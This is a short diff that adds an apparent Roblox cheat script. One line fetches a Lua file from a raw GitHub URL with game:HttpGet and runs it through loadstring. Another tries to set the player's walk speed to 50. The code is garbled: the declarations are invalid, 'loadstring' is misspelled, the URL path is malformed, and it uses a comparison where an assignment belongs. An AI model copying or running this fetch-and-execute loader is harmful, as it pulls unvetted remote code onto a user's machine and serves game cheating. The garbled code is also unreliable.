@@ -1,0 +1,3 @@
+local loadstring , false
+loadatring(game:HttpGet("raw.githubusercontent.com/vxpev5forroblox/.lua"))()
+local Humoid walkspeed == 50
